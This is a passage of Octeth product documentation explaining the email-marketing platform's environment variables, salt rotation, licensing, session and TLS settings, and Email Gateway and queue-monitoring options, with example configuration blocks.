---
layout: doc
---

# Octeth Configuration

Octeth is a powerful and feature-packed email and SMS marketing, marketing automation and audience management software. It includes several features and configuration options. Based on your use case such as running an ESP, using for your own email campaigns only, running an email agency, etc.

In this tutorial, we will show you some fundamental configurations for the optimum email deliverability and ease of use.

## Configuration Modules

Octeth has a few configuration modules:

| Module                | Purpose                                                                                                                                                                                  |
|-----------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Environment Variables | Environment files are `/opt/octeth/.oempro_*_env`, `/opt/octeth/system/.env` and `/opt/octeth/cli/email_campaign_controller/.env` and they are used to set environment for the platform. |
| Configuration Files   | Configuration files are located inside `/opt/octeth/config/` directory and consists of many files. These files can be extended or updated directly.                                      |
| System Settings       | System settings can be configured on the Administrator Dashboard → Preferences → System Settings                                                                                         |

## System Configuration Part I: Environment Variables

Octeth uses environment variable files to configure system-level settings and service connections. These files contain sensitive information like database credentials, API keys, and system parameters that control how Octeth operates.

Understanding these configuration files is essential for proper installation, maintenance, and troubleshooting of your Octeth instance.

### Overview of Environment Files

Octeth uses multiple environment files located in the `/opt/octeth/` directory. Each file serves a specific purpose:

| File Name                            | Location                                     | Purpose                                                                                  |
|--------------------------------------|----------------------------------------------|------------------------------------------------------------------------------------------|
| `.oempro_env`                        | `/opt/octeth/`                               | Main application configuration including URLs, credentials, debugging, and feature flags |
| `.oempro_mysql_env`                  | `/opt/octeth/`                               | MySQL database server configuration                                                      |
| `.oempro_redis_env`                  | `/opt/octeth/`                               | Redis cache server configuration                                                         |
| `.oempro_rabbitmq_env`               | `/opt/octeth/`                               | RabbitMQ message queue server configuration                                              |
| `.oempro_clickhouse_env`             | `/opt/octeth/`                               | ClickHouse analytics database configuration                                              |
| `.oempro_supervisor_env`             | `/opt/octeth/`                               | Supervisor process manager credentials                                                   |
| `system/.env`                        | `/opt/octeth/system/`                        | Laravel backend application configuration                                                |
| `cli/email_campaign_controller/.env` | `/opt/octeth/cli/email_campaign_controller/` | Email delivery campaign controller settings                                              |

### Main Configuration File: `.oempro_env`

The `.oempro_env` file is the primary configuration file for your Octeth installation. It contains all core application settings.

**Location:** `/opt/octeth/.oempro_env`

All `.oempro_*_env` files are parsed with phpdotenv. Every non-comment line must be `KEY=VALUE`, and a value containing spaces must be wrapped in quotes. If `.oempro_env` cannot be parsed, Octeth does not start: web requests show a "Configuration error" page and CLI workers exit, with a message naming the file, line and key (never the value) on stderr and in the PHP error log. If one of the other `.oempro_*_env` files cannot be parsed, the same message is logged and that file's settings are ignored until the line is fixed. Check a file after editing it with `/opt/octeth/cli/octeth.sh env:validate .oempro_env`. The former `OEMPRO_USE_PHPDOTENV` setting has been removed and is ignored if still present.

The example file `_dockerfiles/examples/.oempro_env.example` doubles as the key registry. The comment lines above each key record who reads it (`@reader`), whether it is a secret (`@secret`), the code default when it differs from the shipped value (`@default`) and, rarely, an explicit restart (`@restart`). Its header describes the format.

**Key Configuration Categories:**

1. **Environment Settings**
   ```bash
   APP_ENV=local                    # Environment: local, staging, production
   APP_URL=http://203.0.113.10/   # Your Octeth access URL (always end with /)
   PRODUCT_VERSION=5.9.2            # Octeth version number
   APP_PROJECT_CONFIG_PATH=         # Optional path whose config files are loaded first (project-specific overrides). Empty = none
   COMPOSE_FILE=                    # Optional custom docker-compose file path, relative to the project root. Empty = docker-compose.yml
   ```

2. **Database Credentials**
   ```bash
   MYSQL_HOST=192.168.99.108        # MySQL server IP address or hostname
   MYSQL_USERNAME=oempro            # MySQL database username
   MYSQL_PASSWORD=password          # MySQL database password
   MYSQL_DATABASE=oempro            # MySQL database name
   MYSQL_TABLE_PREFIX=oempro_       # Database table prefix
   LOG_MYSQL_QUERIES=               # Set to 1 to log every MySQL query (debugging; very verbose). Empty/0 = off
   LOG_MYSQL_QUERIES_PATH=          # Custom path for the MySQL query log when LOG_MYSQL_QUERIES is enabled (optional)
   ```

3. **Security & Authentication**
   ```bash
   LICENSE_KEY=eyJ2IjoyLCJraWQiOi...                       # Your signed Octeth license key from my.octeth.com (one line, about 800 characters). A short OCT-... key is not a license
   ADMIN_API_KEY=SZaQtZfJ4zufb8blykpvHPM6IBhFGFf0           # Admin API access key
   HASH_IDS_SALT=<32 random characters>                    # Hashids salt (website tracker ids, ClickBank webhook URLs, SMS callback URLs)
   HASH_IDS_SALT_PREVIOUS=                                 # Previous Hashids salt, decode only, set by security:rotate-salt. Empty = no fallback
   OEMPRO_PASSWORD_SALT=<32 random characters>             # Password hash salt. Never change it on an existing install
   SCRTY_SALT=<32 random characters>                       # Key of the password-reset links, the saved-accounts cookie and the internal disable2fa tokens
   OEMPRO_SUPERADMIN_AUTH_CODE=                            # Optional super-admin auth code (enables an extra admin authentication gate). Empty = disabled
   OEMPRO_SUPERADMIN_AUTH_TIMEOUT=                         # Timeout (seconds) for the super-admin auth session when the code above is set
   ```

   **Install salts.** The installer generates the three salts independently, 32 random characters each, so knowing one tells nothing about the others. An install created by an older installer has one value in all three. An upgrade never changes an existing salt: it only appends keys an install lacks, and `HASH_IDS_SALT_PREVIOUS` is appended empty. Rotate a salt with `./cli/octeth.sh security:rotate-salt`, one salt at a time, because each one breaks different things when it changes. Without `--confirm` the command only prints what the rotation invalidates. With `--confirm` it snapshots `.oempro_env` (undo with `./cli/octeth.sh env:rollback`), writes the new value without printing it, and restarts the workers and containers that cache the key, the same way `env:apply` does. Add `--yes` to rotate while a campaign is sending.

   **Rotating `SCRTY_SALT`.** Run `./cli/octeth.sh security:rotate-salt --salt=scrty --confirm`. It invalidates outstanding password-reset links for users and administrators (anyone mid-reset requests a new link), the saved accounts in the account switcher (each browser forgets them, and they are added again by signing in), and any copy of the internal disable2fa tokens. Two-factor authentication is not affected: each 2FA secret is generated once and stored with the account, and sign-in checks the stored secret, so nobody re-enrols and everyone signs in as before. This also holds for 2FA enrolments made by older versions, whose secret was derived from `SCRTY_SALT` at enrolment time but is stored, so the rotation does not change it. Passwords, sessions, remember-me tokens and API keys are not affected either.

   **Rotating `HASH_IDS_SALT`.** Run `./cli/octeth.sh security:rotate-salt --salt=hashids --confirm`. The current value moves to `HASH_IDS_SALT_PREVIOUS` and a new `HASH_IDS_SALT` is written. New ids are always made with `HASH_IDS_SALT`. Every place that reads an id tries `HASH_IDS_SALT` first and `HASH_IDS_SALT_PREVIOUS` second, so these keep working:

   - website tracker snippets already pasted into customer sites (their user and list ids),
   - ClickBank webhook URLs, whose list hash is stored with the list and never regenerated,
   - SMS provider callback URLs (delivery reports and inbound messages) registered at the provider.

   The Xeebi idempotency key also uses the salt, so a retry of a message submitted before the rotation is not deduplicated by the provider. The command refuses to run while `HASH_IDS_SALT_PREVIOUS` is already set, because overwriting it breaks ids from the earlier generation. `--replace-previous` overrides that once those ids are no longer in use. It also refuses when `HASH_IDS_SALT` is empty.

   **Retiring `HASH_IDS_SALT_PREVIOUS`.** There is no automatic expiry. Keep it for at least 12 months after the rotation, since a tracker snippet or a provider callback URL keeps the old id until someone updates it. Before you remove it, update the tracker snippet on every customer site, set up each ClickBank integration again, and update the callback URLs at each SMS provider, then remove the line from `.oempro_env` by hand and run `./cli/octeth.sh backend:restart`. Ids made with the old salt stop resolving at that point. If you rotate because the old salt leaked, note that while `HASH_IDS_SALT_PREVIOUS` holds it, anyone who has it can still produce ids that resolve. Shorten the grace period in that case and accept that old ids break.

   **Why `OEMPRO_PASSWORD_SALT` cannot be rotated.** Every stored password hash is computed with it, so a new value would lock out every user and administrator. `security:rotate-salt --salt=password` refuses with this explanation. The value stops mattering once passwords are stored with `password_hash()`, which keeps a salt per row. It is also part of `CADDY_DOMAIN_VERIFY_CODE` and the bounce webhook secret, described below.

   **License key and limits.** Copy the license key for the installation's domain from the license page at my.octeth.com. It is one line of about 800 characters, `base64url(payload).base64url(signature)`. The same key shown as a `-----BEGIN OCTETH LICENSE-----` / `-----END OCTETH LICENSE-----` block, or wrapped over several lines, works too: the BEGIN and END lines and all spaces and line breaks are removed before it is checked. Octeth verifies the key offline (Ed25519, with the public keys shipped in the release and never fetched) and takes the edition, the user account limit and the active subscriber limit from it. A key issued before subscriber limits were added means 10,000 subscribers for a Community license and unlimited for a paid one. Only the `APP_URL` host counts as the installation's domain, compared without case and without a leading `www.`.

   Set the key in one of three places. Each one verifies the key before it is saved, refuses an invalid key with the reason, and never prints it:

   - `octeth.sh install:start`: the license key prompt, `--license-key`, `--license-key-file` or `OCTETH_LICENSE_KEY` (see [Octeth CLI Tool](./octeth-cli-tool.md)).
   - `octeth.sh upgrade <zip>`: `--license-key`, `--license-key-file` or `OCTETH_LICENSE_KEY`, or the prompt an interactive upgrade shows when no valid key is set (see [Upgrading Octeth](./upgrading-octeth.md)).
   - The administrator area's Settings > License page: paste the key into the box and save. A key saved there is stored in the database and takes precedence over `LICENSE_KEY` while it is valid. The page shows which one is in use ("Pasted on this page" or "LICENSE_KEY in .oempro_env") and has a button to remove the pasted key, after which `LICENSE_KEY` decides again. If you later edit `LICENSE_KEY` by hand, remove the pasted key, or the pasted one keeps winning.

   The license page and the About page show the licensee and the license key masked to its last four characters, never the key itself.

   Without a valid key (no key, a short `OCT-...` key, a damaged key, a key signed by an unknown key, or one issued for another product or another domain), the installation runs with the Community limits: one user account and 10,000 active subscribers counted across every list. The same address on two lists counts twice, while unsubscribed, unconfirmed and hard-bounced subscribers do not count, and administrator accounts are not limited. The administrator area names the reason. At a limit, new user accounts or new subscribers are refused on every path (subscribe forms, the API, imports, journeys and website tracking). Existing users and subscribers stay, and campaigns and journeys keep sending to them. A `LICENSE_KEY` that starts with `CE` is the Community Edition.

   **Grace period.** An installation that existed before signed license keys gets 30 days from its first run without a valid key, during which its limits do not change. The administrator area, `install.sh` and `upgrade.sh` show the days left. A fresh installation, or a `CE` key, has no grace period. When the license's `updates_until` date is older than the running release, the administrator area shows a warning and nothing is blocked.

   **Email gateway webhook signatures.** The signing key of email gateway webhooks for a sender domain without its own key (the `SigningKey` that `emailgateway.getwebhooks` returns) used to be derived from `LICENSE_KEY`. It is now fixed the first time it is used, and the installer, the upgrade and the license page fix it before they change the key, so replacing a short key with the signed license key does not change it and webhook receivers keep verifying. Setting the key through one of the three places above is the supported way. If you edit `LICENSE_KEY` by hand on an installation that has never sent a gateway webhook, the signing key is fixed from the new value.

4. **Debugging & Logging**
   ```bash
   OEMPRO_DEBUG=true                        # Enable/disable debug mode
   OEMPRO_DEBUG_FILTER_IP=                  # Limit debug to specific IP (optional)
   OEMPRO_LOG_LEVEL=DEBUG                   # Log level: DEBUG, INFO, NOTICE, WARNING, ERROR
   SENDENGINE_LOG_LEVEL=INFO                # Send-engine controller log level (default INFO)
   API_SLOW_QUERY_THRESHOLD=0.1             # Log API calls slower than X seconds
   ```

   `SENDENGINE_LOG_LEVEL` sets the log level of the send-engine controller (`cli/email_campaign_controller/run.php`), the PHP 8.1 process in the send-engine container that spawns and supervises campaign delivery workers. It is separate from `CAMPAIGN_DELIVERY_LOG_LEVEL`, which covers the delivery workers themselves, so you can raise one without the other. Accepted values are `DEBUG`, `INFO`, `NOTICE`, `WARNING`, `ERROR`, `CRITICAL`, `ALERT` and `EMERGENCY`, case-insensitive. The default is `INFO`. An empty value uses `INFO`, and an unknown value falls back to `INFO` with a warning in the controller log naming it. The level applies to both `data/logs/email_campaign_controller-<date>.log` and the controller's stdout. Set it to `DEBUG` to see per-worker spawn and exit lines and the failure-count decay. The value is read when the controller starts, so apply a change with `/opt/octeth/cli/octeth.sh sendengine:restart`.

   **API parameter shape check** <Badge type="tip" text="New in v6.0.4" />

   ```bash
   API_SCALAR_PARAMETER_CHECK=enforce       # enforce (default) or log
   ```

   `API_SCALAR_PARAMETER_CHECK` decides what `api.php` does when a request sends an array or an object for a parameter that takes a single value, for example `Password[]=x` on `User.Update`. With `enforce`, the request is refused with HTTP 400 and `ErrorCode` 100017, and the error names the parameter. With `log`, the request goes through and a warning naming the command and the parameter is written to the application log. Parameters meant to take a list or a structure, such as `Tags`, journey actions and custom field options, are declared per command and still accept one, so only requests that send the wrong shape are affected. The default is `enforce`, and an empty or unknown value also means `enforce`, so an upgraded installation refuses these requests with no change to `.oempro_env`. Set `log` only if an integration sends an array for a parameter that should accept one, and report that parameter so it can be declared. See [API behavior changes](../api-reference/behavior-changes) (octeth/oempro#2954).

5. **Session Management**
   ```bash
   SESSION_LIFETIME_DAYS=30                 # Session validity in whole days
   SESSION_SECURE_COOKIE=false              # Enable for HTTPS/SSL only
   SESSION_HTTPONLY_COOKIE=true             # HttpOnly flag on the session cookie (default: true)
   SESSION_SAMESITE=Lax                     # SameSite attribute of the session cookie: Strict, Lax or None (default: Lax)
   ```

   `SESSION_HTTPONLY_COOKIE` keeps JavaScript from reading the legacy admin and user area session cookie, which protects the session against cross-site scripting. Leave it `true`. `SESSION_SAMESITE` sets the cookie's SameSite attribute. `Lax` lets a link from another site open Octeth while blocking cross-site form posts. `Strict` also drops the cookie on links from other sites, so a user who follows one is asked to log in again. `None` sends the cookie on every cross-site request and requires `SESSION_SECURE_COOKIE=true`. Both keys apply to the next request.

   `SESSION_LIFETIME_DAYS` must be a whole number written with 1 to 9 decimal digits, for example `30`, and the minimum is 1. A leading zero is read as decimal, so `08` means 8 days. An empty value silently uses the default of 30 days. When the value is 0 (including `00` or `000`), has any other character (a sign, a decimal point, a space or a unit) or is longer than nine digits, the new user interface also uses the default of 30 days, and the `oempro_ui` container log shows a warning naming `SESSION_LIFETIME_DAYS`. The warning never prints the value itself. The legacy admin and user areas also treat 0 as the 30-day default, so both interfaces behave the same.

6. **Feature Flags**
   ```bash
   DEMO_MODE_ENABLED=false                  # Disable email delivery for demo
   DISABLE_LATEST_NEWS=false                # Disable news from Octeth servers
   CREDITS_SYSTEM_ENABLED=true              # Enable credit-based delivery
   SKIP_SMTP_DELIVERY=false                 # Skip real SMTP delivery (perf testing only)
   ```

7. **Stuck Campaign Detector**
   ```bash
   STUCK_CAMPAIGN_DETECTOR_ENABLED=true                    # Enable/disable stuck campaign detection
   STUCK_CAMPAIGN_WEBHOOK_URL=                             # Webhook URL for notifications
   STUCK_CAMPAIGN_WEBHOOK_HMAC_SECRET=                     # HMAC secret for webhook security
   STUCK_CAMPAIGN_NOTIFICATION_COOLDOWN_MINUTES=30         # Cooldown between notifications
   STUCK_CAMPAIGN_FAILED_RATE_THRESHOLD=10                 # Failed-recipient rate (%) above which a campaign is flagged as stuck
   ```

   The Stuck Campaign Detector is an automated monitoring system that runs every 5 minutes to identify campaigns stuck in 'Sending' status. A campaign is considered stuck when it has pending batches but no workers are processing them, all workers are silent (haven't pinged in over 60 seconds), or working batches have lost their worker assignments.

   When stuck campaigns are detected, they are automatically logged to the database for audit tracking. If you configure a webhook URL, Octeth will send notifications to help you respond quickly to delivery issues.

   **Configuration Details:**

   - **STUCK_CAMPAIGN_DETECTOR_ENABLED**: Set to `true` to enable automatic detection, or `false` to disable. When disabled, no monitoring occurs.

   - **STUCK_CAMPAIGN_WEBHOOK_URL**: The URL where Octeth will send webhook notifications when stuck campaigns are detected. Leave this empty to disable webhook notifications. Stuck campaigns will still be logged to the database even without a webhook URL.

   - **STUCK_CAMPAIGN_WEBHOOK_HMAC_SECRET**: Optional HMAC-SHA256 secret for webhook signature verification. This adds security by allowing your webhook endpoint to verify requests actually came from Octeth. Generate a secure secret with: `openssl rand -hex 32`

   - **STUCK_CAMPAIGN_NOTIFICATION_COOLDOWN_MINUTES**: How many minutes to wait before sending another notification for the same stuck campaign. Default is 30 minutes. This prevents notification spam if a campaign remains stuck for an extended period.

   - **STUCK_CAMPAIGN_FAILED_RATE_THRESHOLD**: The failed-recipient rate, as a percentage, above which a campaign is flagged as stuck. Default is `10` (10%). A campaign whose failure rate exceeds this value is treated as unhealthy even if batches are otherwise progressing.

   ::: tip Managing Stuck Campaigns
   When campaigns are detected as stuck, you can manage them through the admin UI:
   - **Unstuck Action**: Resets stuck batches to Pending status so workers can retry them automatically
   - **Mark as Failed Action**: Completes all pending batches and marks the campaign as Failed
   :::

   ::: info
   Stuck campaign detection helps maintain delivery reliability by alerting you when campaigns stop progressing. Common causes include worker process crashes, network issues, or system resource constraints. The detection system uses the same health check logic that powers the campaign monitoring dashboard.
   :::

8. **Test Database (PHPUnit)**

   Used only when the automated test suite is running (the `OEMPRO_LARAVEL_TESTS` constant is defined by the PHPUnit bootstrap, or the `X-Octeth-Test-Database` header is sent in the local environment). Ignored during normal operation.

   Leave `TEST_MYSQL_HOST`, `TEST_MYSQL_USERNAME` and `TEST_MYSQL_DATABASE` empty to use the `DB_HOST`, `DB_USERNAME`, `DB_PASSWORD` and `DB_DATABASE` values in `system/.env.testing`, the same database the Laravel tests use. Set any of the three to configure the test connection here instead. The test settings never fall back to the production `MYSQL_*` values, and a database name that does not contain `_test` is refused, so tests cannot reach real data.
   ```bash
   TEST_MYSQL_HOST=                 # Test MySQL host. Empty = DB_HOST from system/.env.testing
   TEST_MYSQL_USERNAME=             # Test MySQL username. Empty = DB_USERNAME from system/.env.testing
   TEST_MYSQL_PASSWORD=             # Test MySQL password. Used only when the settings above are set
   TEST_MYSQL_DATABASE=             # Test database, must contain "_test". Empty = DB_DATABASE from system/.env.testing
   TEST_MYSQL_TABLE_PREFIX=         # Test table prefix. Empty = oempro_
   ```

9. **Error Tracking (Bugsnag / Sentry)**
   ```bash
   BUGSNAG_API=                     # Bugsnag API key for error reporting. Empty = disabled
   SENTRY_API=                      # Sentry DSN for error reporting. Empty = disabled
   SENTRY_ENV=                      # Environment label reported to Sentry (e.g. production, staging)
   ```

10. **Local Development Send Engine**

    Routes outbound mail to a local SMTP catcher (e.g. Mailpit/MailHog) during development so no real email leaves the machine. Leave unset / irrelevant in production.
    ```bash
    LOCALDEV_SENDENGINE_HOST=192.168.99.102  # Local SMTP catcher host
    LOCALDEV_SENDENGINE_PORT=1025            # Local SMTP catcher port
    LOCALDEV_SENDENGINE_USERNAME=            # SMTP username (usually empty for a local catcher)
    LOCALDEV_SENDENGINE_PASSWORD=            # SMTP password (usually empty for a local catcher)
    LOCALDEV_SENDENGINE_ENCRYPTION=tls       # Encryption: tls, ssl, or empty for none
    ```

11. **SMS Delivery Reports**
    ```bash
    SMS_DLR_NOTIFY_BASE_URL=            # Public base URL for SMS delivery-report (DLR) callbacks. For debugging via a tunnel; leave EMPTY in production
    SMS_DELIVERY_REPORTS_ENABLED=true   # Master switch for SMS delivery-report processing (default: true)
    SMS_DELIVERY_REPORT_RETENTION_DAYS=30  # Days to keep rows in oempro_sms_delivery_reports; 0 disables pruning (default: 30)
    ```

    `SMS_DLR_NOTIFY_BASE_URL` is used only when debugging SMS delivery receipts locally (e.g. exposing your machine through a tunnel such as `localtunnel`). Production deployments leave this empty so the system uses the live callback URL.

    `SMS_DELIVERY_REPORTS_ENABLED` controls whether the `oempro_sms_delivery_reports` supervisord worker consumes the durable `sms_delivery_reports` RabbitMQ queue and reconciles each report against `oempro_sms_queue` (Sent / Delivered / Failed). Set it to `false` only if you do not use SMS, or you handle delivery reports elsewhere.

    When it is `false` the inbound delivery-report webhook also **stops enqueueing** new reports onto the `sms_delivery_reports` queue (issue #2644), so the queue no longer grows without bound while the worker is idle. The webhook still returns a success response to the SMS gateway, so the gateway does not retry. Previously the flag gated only the consumer, so with the gateway still pointed at the webhook the queue could grow indefinitely.

    ::: warning When disabled, the worker idles rather than exits
    With this set to `false` the worker starts, logs that it is disabled, and then **idles** — it deliberately does **not** exit. Supervisord runs it with `startsecs=1` and `startretries=10`, so a process that exits immediately is counted as a failed start and the program escalates to a permanent **FATAL** state — not retried again — in about a minute (supervisord backs off between retries; measured: `BACKOFF` at 20s, `FATAL` at 65s), which is indistinguishable from a genuinely broken worker in `supervisorctl status`. Idling keeps it `RUNNING` and harmless.

    Switching the value back to `true` is picked up by the idle worker within about a minute; no container restart is required.

    Note that the public delivery-report webhook endpoint keeps accepting and enqueueing reports regardless of this setting. With processing disabled, the durable `sms_delivery_reports` queue grows unbounded if your gateway is still configured to POST to it — point the gateway away from the webhook as well.
    :::

    `SMS_DELIVERY_REPORT_RETENTION_DAYS` bounds the size of `oempro_sms_delivery_reports`. The scheduled command `sms:delivery-reports:prune` deletes rows older than this once a day, in bounded batches, so the delivery report worker keeps consuming while it runs. Set it to `0` to disable pruning entirely.

    ::: tip Changed in v6.0.0
    Pruning used to run inside the delivery report worker, as one unbounded `DELETE` every 1,000 processed messages. At campaign volume that is a multi-million row transaction inside the only consumer of a durable queue, which stops it consuming for as long as the delete takes. It is now a scheduled command and needs no configuration beyond this key.
    :::

12. **Production Remote Commands (`ocdoc --prod`)**

    SSH hostnames and credentials used when running `ocdoc` commands with the `--prod` flag against a remote production server. Leave a host empty to disable production mode for that container type. In most deployments app/system/supervisor point to the same server.
    ```bash
    PROD_MYSQL_HOST=                 # Production MySQL server SSH host
    PROD_APP_HOST=                   # Production app container SSH host
    PROD_SYSTEM_HOST=                # Production system (Laravel) container SSH host
    PROD_SUPERVISOR_HOST=            # Production supervisor container SSH host
    PROD_MYSQL_USERNAME=             # Production MySQL username (optional; password is prompted interactively)
    PROD_MYSQL_DATABASE=             # Production MySQL database name (optional)
    ```

13. **RabbitMQ Monitoring**
    ```bash
    RABBITMQ_QUEUE_BACKLOG_THRESHOLD=10000   # Queues with more messages_ready than this (and active consumers) trigger a WARNING
    ```

14. **Admin Unsubscribe Behavior**
    ```bash
    ADMIN_UNSUBSCRIBE_BYPASSES_LIST_SUPPRESSION_SETTINGS=true   # When true, admin-initiated unsubscribes skip the list-level suppression auto-add
    ```

    When `true`, admin-initiated unsubscribe actions ("Unsubscribe from this list" / "Unsubscribe from all lists" on the subscriber edit page) skip the list-level `OptOutAddToSuppressionList` / `OptOutAddToGlobalSuppressionList` auto-add. End-user opt-outs from email links and journey actions are unaffected. Set to `false` to restore the pre-#1954 behavior where admin actions also honored the list-level suppression settings.

15. **Email Gateway Performance**
    ```bash
    PHONE_VERIFICATION_REQUIRED_TO_SEND_EG_EMAILS=false   # Require owner phone verification to send via the Email Gateway
    EMAILGATEWAY_SPOOL_STORAGE=redis     # Spool storage driver: 'filesystem' or 'redis'
    EG_WORKER_BATCH_SIZE=50              # Number of emails the Email Gateway delivery worker processes per batch
    EMAILGATEWAY_SENDEMAIL_FULL_LIST=false  # Deliver an emailgateway.sendemail LIST send to the ENTIRE list (paginated) instead of the first 250 only
    EMAILGATEWAY_RATE_LIMIT_FAIL_CLOSED=false  # Reject Email Gateway sends while the send-rate counters (Redis) cannot be read
    EMAILGATEWAY_REQUIRE_TRUSTED=true    # Only Trusted accounts can send through the Email Gateway HTTP API
    EMAILGATEWAY_SMTP_HOST=smtp.example.com   # SMTP host customers connect to; also the inbound SMTP banner and EHLO name
    EMAILGATEWAY_SMTP_PORTS=25,587,465        # SMTP ports shown next to the SMTP host (default: 25,587,465)
    ```

    When `PHONE_VERIFICATION_REQUIRED_TO_SEND_EG_EMAILS` is `true`, the owner user's phone must be verified (`PhoneVerified=1`) before email can be sent through the Email Gateway. The requirement is enforced on **both** ingress paths consistently: the HTTP API send endpoint (`EmailGateway.SendEmail`) and the inbound SMTP relay authentication (`EmailGateway.SMTPRelay`). When `false` (the default), the phone-verification gate is skipped on both paths, so a user with `PhoneVerified=0` can still authenticate over SMTP and send via the API.

    `EMAILGATEWAY_SENDEMAIL_FULL_LIST` controls how a **list** send through the `emailgateway.sendemail` API (a call carrying `TargetListID`) resolves its recipients. Historically such a send resolved only the **first 250** recipients of the list, delivered to them, and returned HTTP 200 with those `MessageID`s — so a list larger than 250 was silently truncated with no signal to the caller (issue #2546). With this set to `true` the send **paginates through the entire list** (in pages of 250, ordered by subscriber ID so no recipient is skipped or duplicated) and returns a `MessageID` for every recipient. It defaults to `false`, which keeps the historical first-250 behaviour **byte-identical**, so existing integrations are unaffected until you opt in. Enable it only when you intend Email Gateway list sends to reach every recipient; note that doing so increases the number of emails (and delivery credits) a single `emailgateway.sendemail` call consumes.

    `EMAILGATEWAY_RATE_LIMIT_FAIL_CLOSED` decides what the Email Gateway does when it cannot read the send-rate counters it keeps in Redis, for example during a Redis outage. With the default `false`, `emailgateway.sendemail` and `emailgateway.smtprelay` allow the send without a rate limit check, so a Redis outage does not stop every customer's mail. Set it to `true` to reject those sends with the rate-limit error instead, which keeps the send-rate limits in force at the cost of availability. Either way, every occurrence is logged at ERROR. Email that is already queued is never failed for this reason: the delivery worker always allows it (issue #3078).

    `EMAILGATEWAY_REQUIRE_TRUSTED` decides whether the Email Gateway HTTP API requires the sending account to be `Trusted`. With the default `true`, `emailgateway.sendemail` rejects a request from an `Untrusted` account with HTTP 403 and error code `40`, and the delivery worker fails email already queued for an account that was moved to `Untrusted`. Journey "Send email" actions use `emailgateway.sendemail`, so they follow the same rule. An administrator allows an account to send by marking it `Trusted`. Set it to `false` to let `Untrusted` accounts send through the HTTP API as before v6.0.1. The SMTP relay (`emailgateway.smtprelay`) requires a `Trusted` account whatever this is set to (issue #3077).

    `EMAILGATEWAY_SMTP_HOST` is the SMTP host your customers connect to for the Email Gateway. It is shown in the user area and returned by `emailgateway.getsmtps` and `emailgateway.addsmtp`. Give the host only, with no scheme or port, for example `smtp.mydomain.com`. It is also the name the inbound SMTP server announces in its greeting (`220 smtp.mydomain.com Mail ESMTP Service ready`) and in its EHLO reply, so the greeting does not reveal your application domain. A fresh install sets it from `--smtp-host`, or to `smtp.` followed by the `APP_URL` host when no host is given, and writes it into `_dockerfiles/inbound-smtp-server/config.json`. After changing it, run `./cli/octeth.sh smtp:sync-config`, which updates that file and restarts `oempro_emailgateway_inbound_smtp`. The upgrade runs the same step. The example value `smtp.example.com` is a placeholder: it is never written into the greeting, so an install that has not set a real host keeps its current greeting. The same step replaces the old product name `Oempro SMTP Server` in the greeting with `Mail`, and keeps any other name you set in `AppName` (issue #3313). When the key is absent, the code default is also `smtp.example.com` (issue #3154).

    `EMAILGATEWAY_SMTP_PORTS` is the comma-separated list of ports shown next to `EMAILGATEWAY_SMTP_HOST` in the user area and returned in `SMTPPorts` by `emailgateway.getsmtps` and `emailgateway.addsmtp`. It only changes what customers are told. It does not open or close a port on the inbound SMTP server.

16. **Caddy Link Proxy (On-Demand TLS)**

    Settings for the Caddy reverse proxy that provisions TLS certificates on demand for custom tracking/link domains.
    ```bash
    CADDY_DOMAIN_VERIFY_CODE=        # Domain-verification code securing the Caddy "ask" endpoint. Value: md5(OEMPRO_PASSWORD_SALT + ADMIN_API_KEY + OEMPRO_PASSWORD_SALT)
    CADDY_ACME_EMAIL=support@octeth.com  # Email used for Let's Encrypt ACME registration
    ```

17. **App Domain TLS**

    Controls how TLS is terminated for the **app domain** (the host in `APP_URL`).
    ```bash
    APP_DOMAIN_TLS_CERT=             # Empty = Caddy on-demand TLS (default). Set to a static PEM path inside the HAProxy container for CDN-fronted app domains.
    ```

    **Default (empty):** the app domain uses Caddy **on-demand TLS** — a certificate is auto-issued and renewed via ACME. This only works when the app domain resolves **directly to this origin**, so the ACME challenge (HTTP-01 / TLS-ALPN-01) can reach Caddy.

    **Behind Cloudflare / a CDN / any reverse proxy:** origin-side ACME is impossible (the challenge terminates at the edge, never the origin), so on-demand TLS can never obtain a certificate and the app fails its TLS handshake — Cloudflare returns **HTTP 525**. Provide an **operator-supplied static certificate** instead: set `APP_DOMAIN_TLS_CERT` to the path, **inside the HAProxy container**, of a combined PEM (full certificate chain followed by the unencrypted private key). HAProxy then terminates the app domain's TLS directly with that certificate and **bypasses Caddy on-demand for the app domain** — no ACME is attempted at the origin for it. Customer tracking domains continue to use Caddy on-demand unchanged.

    A [Cloudflare Origin CA](https://developers.cloudflare.com/ssl/origin-configuration/origin-ca/) certificate is recommended (15-year validity, no renewal); set the Cloudflare SSL/TLS mode to **Full (strict)** so the edge↔origin hop stays encrypted. Drop the PEM in `_dockerfiles/certs/` (bind-mounted read-only into HAProxy at `/etc/ssl/app`) and set, e.g., `APP_DOMAIN_TLS_CERT=/etc/ssl/app/app.pem`. See `_dockerfiles/certs/README.md`. Restart the HAProxy container to apply; it logs the active strategy on boot. **Never** rely on Cloudflare "Flexible" mode (it leaves edge↔origin traffic unencrypted zone-wide).

    **Behind Cloudflare, also configure client IP resolution.** HAProxy hands the real client address from its TCP listener to the static-certificate TLS terminator over the PROXY protocol, so the address Octeth sees is the one that actually connected. Behind Cloudflare that is a Cloudflare edge server. List Cloudflare's IPv4 ranges in `TRUSTED_PROXIES`, or set `TRUST_CLOUDFLARE_CONNECTING_IP=true` with the origin firewalled to Cloudflare's ranges. See item 38, **Trusted Proxies / Client IP Resolution**, below.

18. **Email Gateway Queue Monitor**
    ```bash
    EG_QUEUE_MONITOR_ENABLED=true                       # Enable the eg_queue monitor cron (runs every 5 minutes)
    EG_QUEUE_FAILED_RATE_THRESHOLD=0.25                 # Failed/(Failed+Sent+Delivered) ratio (0..1) over the window that triggers a failure-spike alert
    EG_QUEUE_FAILED_MIN_COUNT=50                        # Absolute floor: the rate alert fires only once at least this many rows failed in the window
    EG_QUEUE_FAILED_WINDOW_MINUTES=15                   # Rolling look-back window (minutes, by ProcessedAt) for the failure-rate check
    EG_QUEUE_PENDING_STALL_MINUTES=15                   # A Pending row counts as overdue when SendAt is older than this many minutes (future SendAt never counts)
    EG_QUEUE_PENDING_STALL_MIN_COUNT=1000              # Overdue Pending rows above which a pending-stall alert fires
    EG_QUEUE_FEEDBACK_MONITOR_ENABLED=true              # Enable the MTA feedback silence check (needs EG_QUEUE_MONITOR_ENABLED=true)
    EG_QUEUE_FEEDBACK_WINDOW_MINUTES=60                 # Window (minutes) for the delivered-event check; keep it longer than your MTA's accounting delay
    EG_QUEUE_FEEDBACK_MIN_SENDS=500                     # Send floor: nothing is checked unless gateway sends in the window (or the bounce silence period) reach this count
